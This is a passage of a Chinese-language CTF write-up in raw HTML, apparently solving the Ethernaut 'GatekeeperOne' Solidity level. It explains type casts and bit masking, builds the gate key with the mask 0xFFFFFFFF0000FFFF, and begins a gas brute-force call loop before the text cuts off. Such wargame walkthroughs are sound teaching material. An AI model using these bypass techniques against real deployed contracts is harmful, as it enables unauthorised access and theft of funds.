keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part one\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part two\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">enter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> gateOne gateTwo <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    entrant <span class=\"token operator\">=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个题目一点思路都没有（跟着教程过一遍）</p>\n<p>先看第一个修饰器</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">modifier</span> <span class=\"token function\">gateOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">!=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><code>msg.sender(address)</code>：消息的发送者（当前调用）</li>\n<li><code>tx.origin(address)</code>：交易的发送者（完整的调用链）</li>\n</ul>\n<p>网上找到一张很清晰的图</p>\n<p><img src=\"https://img.learnblockchain.cn/attachments/2022/02/XyJFUGH5620dcb1e08bda.jpg\" alt=\"16450711251.jpg\"></p>\n<p>根据第一个修饰器的要求：<code>require(msg.sender != tx.origin);</code></p>\n<p>我们需要用智能合约中调用enter，而不是账号直接调用</p>\n<p>先看第三个</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">modifier</span> <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part one\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part two\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"基本类型之间的转换\"><a href=\"#基本类型之间的转换\" class=\"headerlink\" title=\"基本类型之间的转换\"></a>基本类型之间的转换</h3><p>1byte=8位（XXXX XXXX）X为0或1</p>\n<p><code>bytes1=uint8</code>……<code>bytes32=uint256</code></p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">bytes1</span> num1 <span class=\"token operator\">=</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">//0x是16进制的表示方法 12是一字节</span>\n<span class=\"token builtin\">bytes4</span> num2 <span class=\"token operator\">=</span> <span class=\"token number\">0x12121212</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//以此类推12 12 12 12 共四字节</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h4 id=\"隐式转换\"><a href=\"#隐式转换\" class=\"headerlink\" title=\"隐式转换\"></a>隐式转换</h4><p>一般是从存储范围小的类型转换到存储范围大的类型</p>\n<p>在<strong>赋值期间</strong>、<strong>将参数传递给函数</strong>时以及应用运算符时，编译器会<strong>自动</strong>应用隐式类型转换</p>\n<p>eg：<code>uint8</code>可转换为<code>uint16</code>和<code>int128</code>、<code>int256</code></p>\n<p>但<code>int8</code>不可转换为<code>uint256</code>，因为<code>uint256</code>不能保存负值</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">uint8</span> y<span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">uint16</span> z<span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">uint32</span> x <span class=\"token operator\">=</span> y <span class=\"token operator\">+</span> z<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>在这个示例中，加法的操作数y和z没有相同的类型，但<code>uint8</code>可以隐式转换为<code>uint16</code>，在添加之后执行另一个隐式转换</p>\n<p>Tip：在整数之间进行类型转换时，数值不发生改变，而将整数类型，特别是比较大的整数类型转换成小数类型时，由于存储方式不同，有可能存在数据精度的损失。</p></blockquote>\n<h4 id=\"显示转换\"><a href=\"#显示转换\" class=\"headerlink\" title=\"显示转换\"></a>显示转换</h4><ul>\n<li>如果将整数显式转换为更小的类型，则高位位将被截断：</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">uint32</span> a <span class=\"token operator\">=</span> <span class=\"token number\">0x12345678</span><span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">uint16</span> b <span class=\"token operator\">=</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// b will be 0x5678 now</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<ul>\n<li>如果一个整数被显式地转换为一个更大的类型，它会被填充到左边（即，在更高阶的一端）。转换的结果将与原始整数比较：</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">uint16</span> a <span class=\"token operator\">=</span> <span class=\"token number\">0x1234</span><span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">uint32</span> b <span class=\"token operator\">=</span> <span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// b will be 0x00001234 now</span>\n<span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">==</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>固定大小字节类型在转换期间表现不同。它们可以被认为是单个字节的序列，转换为更小的类型将切断序列：</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">bytes2</span> a <span class=\"token operator\">=</span> <span class=\"token number\">0x1234</span><span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">bytes1</span> b <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// b will be 0x12</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<ul>\n<li>如果将固定大小的字节类型显式转换为更大的类型，则会在右侧进行填充。访问固定索引处的字节将在转换前后产生相同的值（如果索引仍在范围内）：</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">bytes2</span> a <span class=\"token operator\">=</span> <span class=\"token number\">0x1234</span><span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">bytes4</span> b <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes4</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// b will be 0x12340000</span>\n<span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> b<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> b<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><code>bytes</code>数组和<code>bytes</code>calldata 切片可以显式转换为固定字节类型 ( <code>bytes1</code>/…/ <code>bytes32</code>)。如果数组比目标固定字节类型长，则会在末尾截断。如果数组比目标类型短，它将在末尾用零填充。</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: GPL-3.0</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.5</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">C</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">bytes</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"abcdefgh\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> c<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> m<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes16</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes16</span> b <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes16</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// if length of m is greater than 16, truncation will happen</span>\n        b <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes16</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// padded on the right, so result is \"abcdefgh\\0\\0\\0\\0\\0\\0\\0\\0\"</span>\n        <span class=\"token builtin\">bytes3</span> b1 <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes3</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// truncated, b1 equals to \"abc\"</span>\n        b <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes16</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// also padded with zeros</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> b1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"位掩码\"><a href=\"#位掩码\" class=\"headerlink\" title=\"位掩码\"></a>位掩码</h3><p>位运算：<strong>任何位（0 或 1）与 0 进行 AND 运算后都为 0，对吗？当用 1 完成相同的操作时，无论实际位是什么。</strong>所以，<code>0 AND 1</code>等于 0 本身。</p>\n<p>现在，如果你这样做<code>0x12345678 AND 0x0000FFFF</code>呢？你会得到<code>0x00005678</code>！</p>\n<p>我们刚刚所做的，<strong>隐藏了一些位，称为“位掩码”。</strong></p>\n<p>直接看题目</p>\n<p><strong>假设要发送的<code>_gateKey</code>是<code>0x B1 B2 B3 B4 B5 B6 B7 B8</code></strong></p>\n<p>第一行</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part one\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>如果要写出第一行，则必须满足一下条件：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token number\">0</span>x B5 B6 B7 B8 <span class=\"token operator\">==</span> <span class=\"token number\">0</span>x <span class=\"token number\">00</span> <span class=\"token number\">00</span> B7 B8<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>所以<code>B5</code>和<code>B6</code>必须为<code>0</code>！</p>\n<p>第二行</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part two\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>需要满足条件：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token number\">0</span>x <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> B5 B6 B7 B8 <span class=\"token operator\">!=</span> <span class=\"token number\">0</span>x B1 B2 B3 B4 B5 B6 B7 B8<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>所以前四个字节不能为0（也就是前四个字节可以是除0之外的任何内容）</p>\n<p>第三行</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>需要满足要求：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token number\">0</span>x B5 B6 B7 B8 <span class=\"token operator\">=</span> <span class=\"token number\">0</span>x <span class=\"token number\">00</span> <span class=\"token number\">00</span> SECOND_LAST_BYTE_OF_YOUR_ADDR LAST_BYTE_OF_YOUR_ADDR<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>比较1和3行，<strong>得到<code>B7</code>和<code>B8</code>是攻击合约地址的最后一个字节！</strong></p>\n<p><strong>关键是<code>0x ANY_BYTE ANY_BYTE ANY_BYTE ANY_BYTE 00 00 SECOND_LAST_BYTE_OF_YOUR_ADDR LAST_BYTE_OF_YOUR_ADDR</code>。</strong></p>\n<p>可以使用攻击合约的地址来制作<code>_gateKey</code>：</p>\n<ul>\n<li>获取地址的最后8个字节：通过将地址存储在<code>uint64</code>数据类型中来执行此操作。</li>\n<li>通过位掩码使 B5 和 B6 为零：使用从上一步获得的值执行与操作<code>0xFFFFFFFF0000FFFF</code>。</li>\n<li>现在，只需将其存储<code>uint64</code>到<code>bytes8</code>中，因为<code>enter()</code>函数需要<code>bytes8</code>.</li>\n</ul>\n<p>长这样：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">bytes8</span> key <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFFFFFF0000FFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：这里的<code>msg.sender</code>变成<code>tx.origin</code>了！！！</p></blockquote>\n<p>再来看看第2个修饰器</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">modifier</span> <span class=\"token function\">gateTwo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">gasleft</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">8191</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><code>gasleft()</code>函数，用于返回剩余的gas</p>\n<p>需要满足要求：<strong>发送既能确保我们的交易被执行，又能保证gate 2开始时剩余的gas量是8191的倍数的确切的gas</strong></p>\n<p>解决方法：</p>\n<p>首先，我们需要发送的气体总量可以表示为<code>x + (8191 * k)</code>，在这里<code>x</code>是调用之前用完的gas量，那么<code>gasLeft()</code>剩下的是8191的倍数</p>\n<p>我们可以把<code>k</code>固定为一个数，比如说3，现在需要弄清楚的是<code>x</code></p>\n<p>所以使用暴力破解：即尝试发送具有的所有可能值的交易<code>x</code></p>\n<p>类似于这样：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">uint256</span> gasBrute<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>gasBrute <span class=\"token operator\">=</span> _lowerGasBrute<span class=\"token punctuation\">;</span> gasBrute <span class=\"token operator\">&lt;=</span> _upperGasBrute<span class=\"token punctuation\">;</span> gasBrute<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> _gatekeeperAddr<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">gas</span><span class=\"token punctuation\">(</span>gasBrute <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8191</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span> <span class=\"token comment\">// `x` is replaced by `gasBrute`</span>\n        abi<span class=\"token punctuation\">.</span><span class=\"token 